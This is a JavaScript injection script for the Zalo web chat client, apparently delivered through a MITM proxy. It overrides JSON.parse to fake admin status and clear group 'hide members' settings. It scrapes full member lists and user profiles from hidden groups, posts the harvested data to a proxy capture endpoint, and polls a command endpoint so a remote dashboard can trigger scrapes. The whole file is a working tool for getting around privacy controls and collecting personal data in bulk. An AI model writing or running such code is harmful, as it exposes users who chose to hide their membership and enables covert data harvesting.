(function(){
    let g = typeof window !== 'undefined' ? window : self;
    if (g.__zalo_json_hooked) return;
    g.__zalo_json_hooked = true;

    const _origParse = JSON.parse;
    const _origStringify = JSON.stringify;

    // ── Tracking sets ──
    g.__zalo_fetching_groups = g.__zalo_fetching_groups || new Set();
    g.__zalo_fetched_full = g.__zalo_fetched_full || new Set();
    g.__zalo_fetching_profiles = g.__zalo_fetching_profiles || new Set();

    // ── Send captured data back to MITM proxy ──
    function sendToProxy(data, tag) {
        try {
            fetch('https://chat.zalo.me/api/capture_dump', {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: '[JSON.parse] ' + _origStringify(data)
            }).catch(()=>{});
            if (tag) console.log('[ZALO]', tag);
        } catch(_) {}
    }

    // ── Normalize group/user IDs (strip g prefix, uid: prefix, etc) ──
    function normalizeId(val) {
        let id = String(val || '').trim();
        if (!id) return '';
        id = id.replace(/^uid:/i, '');
        if (/^u\d+$/.test(id)) id = id.slice(1);
        if (/^g\d+$/.test(id)) id = id.slice(1);
        const underscore = id.indexOf('_');
        if (underscore > 0 && /^\d+$/.test(id.slice(0, underscore))) {
            id = id.slice(0, underscore);
        }
        return id;
    }

    function pickUserId(raw) {
        if (!raw || typeof raw !== 'object') return raw;
        return raw.userId || raw.uid || raw.id || raw.user_id || raw.userID ||
            raw.memberId || raw.member_id || raw.uidTo || raw.uidFrom || raw.ownerId || '';
    }

    // ══════════════════════════════════════════════════════════════════
    // ── Webpack Runtime Access (ported from ZaloBDS zalo-groups.js) ──
    // ══════════════════════════════════════════════════════════════════

    function getWebpackRequire() {
        if (g.__zaloWebpackRequire) return g.__zaloWebpackRequire;
        const runtime = g.webpackJsonp;
        if (!runtime || typeof runtime.push !== 'function') return null;
        const probeId = '__zalo_probe_' + Date.now() + '_' + Math.random().toString(36).slice(2);
        try {
            runtime.push([[probeId], {
                [probeId]: function(module, exports, __webpack_require__) {
                    g.__zaloWebpackRequire = __webpack_require__;
                }
            }, [[probeId]]]);
        } catch(e) { return null; }
        return g.__zaloWebpackRequire || null;
    }

    function readModuleExport(requireFn, moduleId) {
        try { return requireFn(moduleId); } catch(e) { return null; }
    }

    function findWebpackExport(requireFn, predicate) {
        const cache = requireFn?.c || {};
        for (let moduleId in cache) {
            try {
                let exports = cache[moduleId]?.exports;
                if (!exports) continue;
                if (predicate(exports)) return exports;
                if (exports.default && predicate(exports.default)) return exports.default;
                for (let key of Object.keys(exports).slice(0, 20)) {
                    if (predicate(exports[key])) return exports[key];
                }
            } catch(e) {}
        }
        return null;
    }

    function resolveGroupRuntime() {
        if (g.__zalo_groupRuntime) return g.__zalo_groupRuntime;
        const req = getWebpackRequire();
        if (!req) return null;

        // Try known module IDs first (from ZaloBDS)
        let svc = null, decoder = null;
        try {
            let svcMod = readModuleExport(req, 'fBUP');
            svc = svcMod?.default || svcMod;
        } catch(e) {}

        // Fallback: scan cache for GroupService
        if (!svc || typeof svc?.getGroupInfoV2 !== 'function') {
            svc = findWebpackExport(req, v =>
                v && typeof v.getGroupInfoV2 === 'function' &&
                (typeof v.getGroupInfo === 'function' || typeof v.getGroupMemberList === 'function')
            );
        }

        if (!svc) return null;

        try {
            let decMod = readModuleExport(req, 'kCOK');
            decoder = decMod?.a || decMod?.default || decMod;
        } catch(e) {}

        // Fallback: scan for decoder function
        if (typeof decoder !== 'function') {
            decoder = findWebpackExport(req, v =>
                typeof v === 'function' && v.length >= 1 && v.toString().includes('decrypt')
            );
        }

        const result = {
            service: svc,
            decoder: typeof decoder === 'function' ? decoder : null
        };
        g.__zalo_groupRuntime = result;
        console.log('[ZALO] Resolved GroupRuntime:', svc ? 'OK' : 'FAIL', 'decoder:', decoder ? 'OK' : 'NONE');
        return result;
    }

    function resolveProfileService() {
        if (g.__zalo_profileService) return g.__zalo_profileService;
        const req = getWebpackRequire();
        if (!req) return null;

        // Try known module ID
        try {
            let m = readModuleExport(req, 'UiPd');
            let svc = m?.default || m;
            if (svc && typeof svc.getProfileFriendByIds === 'function') {
                g.__zalo_profileService = svc;
                return svc;
            }
        } catch(e) {}

        // Scan cache
        let svc = findWebpackExport(req, v =>
            v && (typeof v.getProfileFriendByIds === 'function' ||
                  typeof v.getProfileStrangerSync === 'function' ||
                  typeof v.getStrangerCache === 'function')
        );
        if (svc) g.__zalo_profileService = svc;
        return svc;
    }

    async function unwrapRuntimeResponse(raw, decoder) {
        let rawData = raw?.data?.data || raw?.data || raw;
        if (rawData && typeof rawData === 'object') {
            if (rawData.error_code !== undefined && rawData.error_code !== 0) throw rawData;
        }
        if (typeof decoder === 'function') {
            try {
                let decoded = await decoder(raw);
                if (decoded && typeof decoded === 'object') {
                    if (decoded.error_code !== undefined && decoded.error_code !== 0) throw decoded;
                    return decoded;
                }
            } catch(e) {
                if (e && typeof e === 'object' && e.error_code !== undefined && e.error_code !== 0) throw e;
            }
        }
        return rawData;
    }

    async function postFromPage(urls, body) {
        for (let rawUrl of urls) {
            try {
                let u = new URL(rawUrl);
                u.searchParams.set('zpw_ver', '682');
                u.searchParams.set('zpw_type', '30');
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);
                let r = await fetch(u.toString(), {
                    method: 'POST', credentials: 'include',
                    signal: controller.signal,
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({ params: _origStringify(body) }).toString()
                });
                clearTimeout(timeoutId);
                if (!r.ok) continue;
                let data = await r.json();
                if (data?.error && data.error !== 0 && data.error !== '0') continue;
                return data;
            } catch(e) {}
        }
        return null;
    }

    // ══════════════════════════════════════════════════════════════════
    // ── CORE: fetchFullGroupInfo via Webpack getGroupInfoV2 ──────────
    // Đảm bảo bot.py có thể gọi trực tiếp hàm này
    window.__proxify_fetchFullGroupInfo = fetchFullGroupInfo;

    async function fetchFullGroupInfo(groupId) {
        let normId = normalizeId(groupId);
        if (!normId) return;
        if (g.__zalo_fetched_full.has(normId)) {
            sendToProxy({ _type: 'fetchComplete', groupId: normId }, '✅ Fetch Complete (already fetched) for ' + normId);
            return;
        }
        g.__zalo_fetched_full.add(normId);

        console.log('[ZALO] fetchFullGroupInfo START for', normId);

        const runtime = resolveGroupRuntime();
        if (!runtime?.service || typeof runtime.service.getGroupInfoV2 !== 'function') {
            console.warn('[ZALO] getGroupInfoV2 not available, falling back to HTTP APIs');
            await fetchHiddenMembersHTTP(normId);
            return;
        }

        let page = 1;
        const maxPages = 100;
        let allMemberIds = new Set();
        let allMemberProfiles = [];
        let combinedInfo = null;
        let groupName = '';
        let totalMembers = 0;

        try {
            while (page <= maxPages) {
                let raw = await runtime.service.getGroupInfoV2(normId, page);
                let decoded = await unwrapRuntimeResponse(raw, runtime.decoder);

                if (!combinedInfo) combinedInfo = decoded;

                // Extract name and total
                groupName = decoded?.name || decoded?.groupName || decoded?.displayName || decoded?.dName || groupName;
                totalMembers = decoded?.totalMember || decoded?.totalMembers || decoded?.memberCount || totalMembers;

                // Extract member IDs from this page
                let pageMemberIds = [];
                for (let k of ['memberList', 'memVerList', 'members', 'memberIds']) {
                    let arr = decoded?.[k];
                    if (Array.isArray(arr)) {
                        for (let m of arr) {
                            let mid = typeof m === 'object' ? normalizeId(pickUserId(m)) : normalizeId(m);
                            if (mid) { pageMemberIds.push(mid); allMemberIds.add(mid); }
                        }
                    }
                }

                // Extract member profiles from this page
                for (let k of ['memberProfiles', 'topMember', 'currentMems', 'currentMembers', 'admins']) {
                    let arr = decoded?.[k];
                    if (Array.isArray(arr)) {
                        for (let p of arr) {
                            if (p && typeof p === 'object') {
                                let mid = normalizeId(pickUserId(p));
                                if (mid) {
                                    allMemberIds.add(mid);
                                    allMemberProfiles.push(p);
                                }
                            }
                        }
                    }
                }

                console.log('[ZALO] Group', normId, 'page', page, ':', pageMemberIds.length, 'ids, total accumulated:', allMemberIds.size, 'hasMore:', !!decoded?.hasMoreMember);

                if (!decoded?.hasMoreMember) break;
                page++;
                // Rate limit delay (same as ZaloBDS)
                await new Promise(r => setTimeout(r, 500));
            }
        } catch(e) {
            console.warn('[ZALO] getGroupInfoV2 pagination error at page', page, ':', e.message || e);
        }

        // If still incomplete, try HTTP API fallback
        if (totalMembers && allMemberIds.size < totalMembers) {
            console.log('[ZALO] Incomplete:', allMemberIds.size, '/', totalMembers, '- trying HTTP getmemberlist');
            try {
                let requestGroupIds = [...new Set([normId, 'g' + normId])];
                let apiRes = await postFromPage([
                    'https://tt-chat2-wpa.chat.zalo.me/api/group/getmemberlist',
                    'https://tt-chat4-wpa.chat.zalo.me/api/group/getmemberlist',
                    'https://tt-chat1-wpa.chat.zalo.me/api/group/getmemberlist',
                    'https://tt-group-wpa.chat.zalo.me/api/group/getmemberlist',
                    'https://tt-profile-wpa.chat.zalo.me/api/social/group/members'
                ], { grid: normId, gridList: requestGroupIds, groupId: normId });

                if (apiRes) {
                    let payload = apiRes?.data || apiRes?.response || apiRes || {};
                    let info = payload?.groupInfo?.[normId] || payload?.groupInfo?.['g'+normId] || payload?.[normId] || payload;
                    for (let k of ['memberList', 'memVerList', 'members', 'memberIds']) {
                        let arr = info?.[k];
                        if (Array.isArray(arr)) {
                            for (let m of arr) {
                                let mid = typeof m === 'object' ? normalizeId(pickUserId(m)) : normalizeId(m);
                                if (mid) allMemberIds.add(mid);
                            }
                        }
                    }
                    for (let k of ['memberProfiles', 'topMember', 'currentMems', 'admins']) {
                        let arr = info?.[k];
                        if (Array.isArray(arr)) {
                            for (let p of arr) {
                                if (p && typeof p === 'object') {
                                    let mid = normalizeId(pickUserId(p));
                                    if (mid) { allMemberIds.add(mid); allMemberProfiles.push(p); }
                                }
                            }
                        }
                    }
                }
            } catch(e) {}
        }

        console.log('[ZALO] fetchFullGroupInfo DONE for', normId, ':', allMemberIds.size, 'members,', allMemberProfiles.length, 'profiles');

        // Build comprehensive payload and send to proxy
        if (allMemberIds.size > 0) {
            let fullPayload = {
                isGroup: true,
                groupId: normId,
                userId: 'g' + normId,
                displayName: groupName,
                totalMember: totalMembers || allMemberIds.size,
                memberIds: [...allMemberIds],
                memberList: [...allMemberIds],
                memVerList: [...allMemberIds],
                memberProfiles: allMemberProfiles,
                _source: 'getGroupInfoV2_paginated',
                _pages: page
            };

            // Copy extra info from combinedInfo
            if (combinedInfo) {
                for (let k of ['creatorId', 'adminIds', 'type', 'subType', 'setting', 'globalId', 'avatar', 'desc', 'e2ee']) {
                    if (combinedInfo[k] !== undefined) fullPayload[k] = combinedInfo[k];
                }
            }

            sendToProxy(fullPayload, 'Full group ' + normId + ': ' + allMemberIds.size + ' members via getGroupInfoV2 (' + page + ' pages)');

            try {
                // Now fetch full profiles for ALL member IDs
                await fetchUserProfiles([...allMemberIds]);
            } catch(e) {
                console.error('[ZALO] Error fetching user profiles:', e);
            } finally {
                // Signal completion to backend
                sendToProxy({ _type: 'fetchComplete', groupId: normId }, '✅ Fetch Complete for ' + normId);
            }
        } else {
            // Signal completion even if no members found to clear the job
            sendToProxy({ _type: 'fetchComplete', groupId: normId }, '✅ Fetch Complete (empty) for ' + normId);
        }
    }

    // HTTP-only fallback when Webpack runtime is not available
    async function fetchHiddenMembersHTTP(groupId) {
        if (!groupId || g.__zalo_fetching_groups.has(groupId)) return;
        g.__zalo_fetching_groups.add(groupId);

        let normId = normalizeId(groupId);
        let requestGroupIds = [...new Set([normId, 'g' + normId])];

        try {
            let apiRes = await postFromPage([
                'https://tt-chat2-wpa.chat.zalo.me/api/group/getmemberlist',
                'https://tt-chat4-wpa.chat.zalo.me/api/group/getmemberlist',
                'https://tt-chat1-wpa.chat.zalo.me/api/group/getmemberlist',
                'https://tt-group-wpa.chat.zalo.me/api/group/getmemberlist',
                'https://tt-profile-wpa.chat.zalo.me/api/social/group/members'
            ], { grid: normId, gridList: requestGroupIds, groupId: normId });

            if (apiRes) {
                let payload = apiRes.data || apiRes;
                if (!payload.groupId) payload.groupId = normId;
                payload.isGroup = true;
                sendToProxy(apiRes, 'Fetched hidden members (HTTP) for ' + normId);
            }
        } catch(e) {
            console.error('[ZALO] Error in HTTP fallback:', e);
        } finally {
            sendToProxy({ _type: 'fetchComplete', groupId: normId }, '✅ Fetch Complete (HTTP) for ' + normId);
        }
    }

    // ══════════════════════════════════════════════════════════════════
    // ── Fetch full user profiles (Webpack + API fallbacks) ───────────
    // ══════════════════════════════════════════════════════════════════

    async function fetchUserProfiles(userIds) {
        if (!userIds || !userIds.length) return;
        let uids = [...new Set(userIds.map(id => normalizeId(id)).filter(Boolean))];
        // Filter out already-fetched
        uids = uids.filter(id => !g.__zalo_fetching_profiles.has(id));
        if (!uids.length) return;
        uids.forEach(id => g.__zalo_fetching_profiles.add(id));

        const service = resolveProfileService();
        const batchSize = 50;

        for (let i = 0; i < uids.length; i += batchSize) {
            let batch = uids.slice(i, i + batchSize);
            try {
                let profiles = {};
                let missing = [...batch];

                // 1. Local cache (Webpack store)
                if (service) {
                    for (let uid of batch) {
                        let p = null;
                        try {
                            if (typeof service.getProfileByIdFromCache === 'function') p = service.getProfileByIdFromCache(uid);
                            if (!p && typeof service.getStrangerCache === 'function') p = service.getStrangerCache(uid);
                            if (!p && typeof service.getProfileStrangerSync === 'function') p = service.getProfileStrangerSync(uid);
                            if (!p && typeof service.getStranger === 'function') p = service.getStranger(uid);
                            if (!p && typeof service.getUserSync === 'function') p = service.getUserSync(uid);
                        } catch(e) {}

                        let pName = p ? (p.displayName || p.zaloName || p.name || p.dName || '') : '';
                        if (!pName && service) {
                            try { if (typeof service.getDName === 'function') pName = service.getDName(uid); } catch(e) {}
                            try { if (!pName && typeof service.getPhonebookName === 'function') pName = service.getPhonebookName(uid); } catch(e) {}
                        }

                        if (p && pName && pName !== 'Người dùng ẩn') {
                            if (!p.displayName) p.displayName = pName;
                            profiles[uid] = p;
                            missing = missing.filter(x => x !== uid);
                        }
                    }
                }

                // 2. Webpack service (friends batch)
                if (missing.length > 0 && service && typeof service.getProfileFriendByIds === 'function') {
                    try {
                        let raw = await service.getProfileFriendByIds(missing, 5);
                        let decoded = await unwrapRuntimeResponse(raw, null);
                        if (decoded) {
                            let list = Array.isArray(decoded) ? decoded : Object.values(decoded);
                            for (let p of list) {
                                if (p && typeof p === 'object') {
                                    let uid = normalizeId(pickUserId(p));
                                    if (uid) { profiles[uid] = p; missing = missing.filter(x => x !== uid); }
                                }
                            }
                        }
                    } catch(e) {}
                }

                // 3. getprofiles/v2 API (strangers)
                if (missing.length > 0) {
                    try {
                        let strUids = missing.map(String);
                        let apiRes = await postFromPage([
                            'https://tt-profile-wpa.chat.zalo.me/api/social/friend/getprofiles/v2',
                            'https://tt-chat2-wpa.chat.zalo.me/api/social/friend/getprofiles/v2',
                            'https://tt-chat4-wpa.chat.zalo.me/api/social/friend/getprofiles/v2'
                        ], { uids: strUids, userIds: strUids, phoneList: strUids });
                        if (apiRes) {
                            let rt = resolveGroupRuntime();
                            let decoded = await unwrapRuntimeResponse(apiRes, rt?.decoder || null);
                            let payload = decoded?.data || decoded?.response || decoded || {};
                            let profList = Array.isArray(payload) ? payload : (typeof payload === 'object' ? Object.values(payload) : []);
                            for (let p of profList) {
                                if (p && typeof p === 'object') {
                                    let uid = normalizeId(pickUserId(p));
                                    if (uid) { profiles[uid] = p; missing = missing.filter(x => x !== uid); }
                                }
                            }
                        }
                    } catch(e) {}
                }

                // 4. get-bizacc API (business/OA accounts)
                if (missing.length > 0) {
                    try {
                        let strUids = missing.map(String);
                        let bizRes = await postFromPage([
                            'https://tt-profile-wpa.chat.zalo.me/api/social/friend/get-bizacc',
                            'https://tt-chat2-wpa.chat.zalo.me/api/social/friend/get-bizacc'
                        ], { uids: strUids, userIds: strUids });
                        if (bizRes) {
                            let rt = resolveGroupRuntime();
                            let decoded = await unwrapRuntimeResponse(bizRes, rt?.decoder || null);
                            let payload = decoded?.data || decoded?.response || decoded || {};
                            let bizList = Array.isArray(payload) ? payload : (typeof payload === 'object' ? Object.values(payload) : []);
                            for (let p of bizList) {
                                if (p && typeof p === 'object') {
                                    let uid = normalizeId(pickUserId(p));
                                    if (uid) profiles[uid] = p;
                                }
                            }
                        }
                    } catch(e) {}
                }

                // 5. Send profiles to proxy
                let profileList = Object.values(profiles);
                if (profileList.length > 0) {
                    sendToProxy({ _type: 'userProfiles', profiles: profileList },
                        'Profiles: ' + profileList.length + ' (batch ' + i + '-' + (i + batch.length) + ')');
                }
            } catch(e) {
                console.error('[ZALO] Profile batch error:', e);
            }

            if (i + batchSize < uids.length) await new Promise(r => setTimeout(r, 500));
        }
    }

    // ══════════════════════════════════════════════════════════════════
    // ── Detection: should we capture this JSON.parse result? ─────────
    // ══════════════════════════════════════════════════════════════════

    // Detect ANY group data (lowered thresholds compared to old code)
    function isGroupData(obj) {
        if (!obj || typeof obj !== 'object') return false;

        // Has group-identifying keys
        let hasGroupKeys = obj.isGroup || obj.groupId || obj.grid ||
            (obj.userId && String(obj.userId).startsWith('g')) ||
            obj.totalMember || obj.memberIds || obj.memberList;
        if (hasGroupKeys) return true;

        // Has memberProfiles with any data
        if (Array.isArray(obj.memberProfiles) && obj.memberProfiles.length > 0) return true;
        if (Array.isArray(obj.topMember) && obj.topMember.length > 0) return true;

        // groupInfo container
        if (obj.groupInfo && typeof obj.groupInfo === 'object') return true;

        return false;
    }

    // Detect if group needs full member fetch (hidden or incomplete)
    function needsFullFetch(obj) {
        if (!obj || typeof obj !== 'object') return false;

        let totalMember = obj.totalMember || obj.totalMembers || 0;
        let memberIds = obj.memberIds || obj.memberList || obj.memVerList || [];
        let memberCount = Array.isArray(memberIds) ? memberIds.length : 0;

        // lockViewMember is set (hidden members)
        let setting = obj.setting;
        if (setting && typeof setting === 'object') {
            if (setting.lockViewMember > 0 || setting.hideMembers > 0 || setting.hideMember > 0) return true;
        }

        // totalMember significantly larger than captured memberIds
        if (totalMember > 0 && memberCount > 0 && memberCount < totalMember * 0.8) return true;

        // Has more member pages
        if (obj.hasMoreMember) return true;

        // Community or large group
        if (obj.type === 3 || obj.type === '3') return true;
        if (totalMember > 20 && memberCount < 10) return true;

        return false;
    }

    // ══════════════════════════════════════════════════════════════════
    // ── Main JSON.parse override ─────────────────────────────────────
    // ══════════════════════════════════════════════════════════════════

    JSON.parse = function(str) {
        const result = _origParse.apply(this, arguments);
        try {
            if (result && typeof result === 'object') {
                // ── 1. Unlock hidden member UI ──
                let hasHidden = false;

                function unlockAdmin(obj) {
                    if (!obj || typeof obj !== 'object') return;
                    if (obj.hasOwnProperty('isAdmin')) obj.isAdmin = true;
                    if (obj.hasOwnProperty('role') && typeof obj.role === 'number' && obj.role > 0) obj.role = 1;

                    let hideKeys = ['hideMembers', 'isHideMember', 'memberListHidden', 'hideMember', 'isHideMembers'];
                    for (let k of hideKeys) {
                        if (obj[k]) { hasHidden = true; obj[k] = false; }
                        let kl = k.toLowerCase();
                        if (kl !== k && obj[kl]) { hasHidden = true; obj[kl] = false; }
                    }
                    if (obj.setting && typeof obj.setting === 'object') {
                        if (obj.setting.hideMembers > 0) { hasHidden = true; obj.setting.hideMembers = 0; }
                        if (obj.setting.hideMember > 0) { hasHidden = true; obj.setting.hideMember = 0; }
                        if (obj.setting.lockViewMember > 0) { hasHidden = true; obj.setting.lockViewMember = 0; }
                    }
                    for (let key in obj) {
                        if (obj[key] && typeof obj[key] === 'object') unlockAdmin(obj[key]);
                    }
                }

                unlockAdmin(result);

                // ── 2. Capture group data ──
                let target = result;
                if (result.data && typeof result.data === 'object') target = result.data;

                if (isGroupData(target) || isGroupData(result)) {
                    // ── Extract group ID and check if full fetch needed ──
                    let groupId = normalizeId(
                        target.groupId || target.grid || target.id ||
                        result.groupId || result.grid || result.id ||
                        (target.userId && String(target.userId).startsWith('g') ? String(target.userId).slice(1) : '') ||
                        (result.userId && String(result.userId).startsWith('g') ? String(result.userId).slice(1) : '')
                    );

                    let currentGroupId = null;
                    try {
                        if (typeof window !== 'undefined') {
                            if (window.__zalo_groupRuntime && window.__zalo_groupRuntime.currentGroupId) {
                                currentGroupId = normalizeId(window.__zalo_groupRuntime.currentGroupId);
                            }
                        }
                    } catch(e) {}

                    // Send the raw group data to proxy
                    sendToProxy(result, 'Captured group data via JSON.parse');

                    if (groupId && (needsFullFetch(target) || needsFullFetch(result) || hasHidden)) {
                        // TẮT TỰ ĐỘNG FETCH TOÀN BỘ MEMBER LÚC BACKGROUND SYNC!
                        // Việc này sẽ do bot.py gọi thủ công bằng window.__proxify_fetchFullGroupInfo
                        // fetchFullGroupInfo(groupId);
                    }

                    // ── 4. Also fetch profiles for any member IDs we already have ──
                    let memberIds = [];
                    let src = target || result;
                    for (let k of ['memberList', 'memVerList', 'memberIds', 'members', 'topMember', 'currentMems', 'admins']) {
                        let arr = src[k];
                        if (Array.isArray(arr)) {
                            for (let m of arr) {
                                let mid = typeof m === 'object' ? normalizeId(pickUserId(m)) : normalizeId(m);
                                if (mid) memberIds.push(mid);
                            }
                        }
                    }
                    if (src.groupInfo && typeof src.groupInfo === 'object') {
                        for (let gid in src.groupInfo) {
                            let gi = src.groupInfo[gid];
                            if (!gi || typeof gi !== 'object') continue;
                            for (let k of ['memberList', 'memVerList', 'memberIds', 'topMember', 'admins']) {
                                let arr = gi[k];
                                if (Array.isArray(arr)) {
                                    for (let m of arr) {
                                        let mid = typeof m === 'object' ? normalizeId(pickUserId(m)) : normalizeId(m);
                                        if (mid) memberIds.push(mid);
                                    }
                                }
                            }
                        }
                    }
                    if (memberIds.length > 0) {
                        // TẮT LUÔN VIỆC TỰ ĐỘNG TẢI PROFILE KHI BACKGROUND SYNC
                        // fetchUserProfiles(memberIds);
                    }
                }
            }
        } catch(e) {}
        return result;
    };

    // ══════════════════════════════════════════════════════════════════
    // ── Command Polling (receive commands from dashboard) ────────────
    // ══════════════════════════════════════════════════════════════════

    if (!g.__zalo_command_polling) {
        g.__zalo_command_polling = true;
        
        async function pollCommands() {
            try {
                // Must use a cross-origin API domain (tt-profile-wpa) to bypass chat.zalo.me's Service Worker!
                const res = await fetch('https://tt-profile-wpa.chat.zalo.me/api/zalo/commands/pending');
                const commands = await res.json();
                if (Array.isArray(commands) && commands.length > 0) {
                    for (const cmd of commands) {
                        if (cmd.action === 'fetch_members' && cmd.group_id) {
                            console.log('[ZALO] 📡 Received fetch_members command for group:', cmd.group_id);
                            if (g.__proxify_fetchFullGroupInfo) {
                                g.__proxify_fetchFullGroupInfo(cmd.group_id);
                            } else {
                                console.warn('[ZALO] fetchFullGroupInfo not available yet');
                            }
                        }
                    }
                }
            } catch(_) {}
        }
        
        // Poll every 5 seconds
        setInterval(pollCommands, 5000);
        console.log('[ZALO] 📡 Command polling started (5s interval)');
    }

    console.log('[ZALO] Enhanced JSON.parse hook installed (Webpack runtime + getGroupInfoV2 pagination)');
})();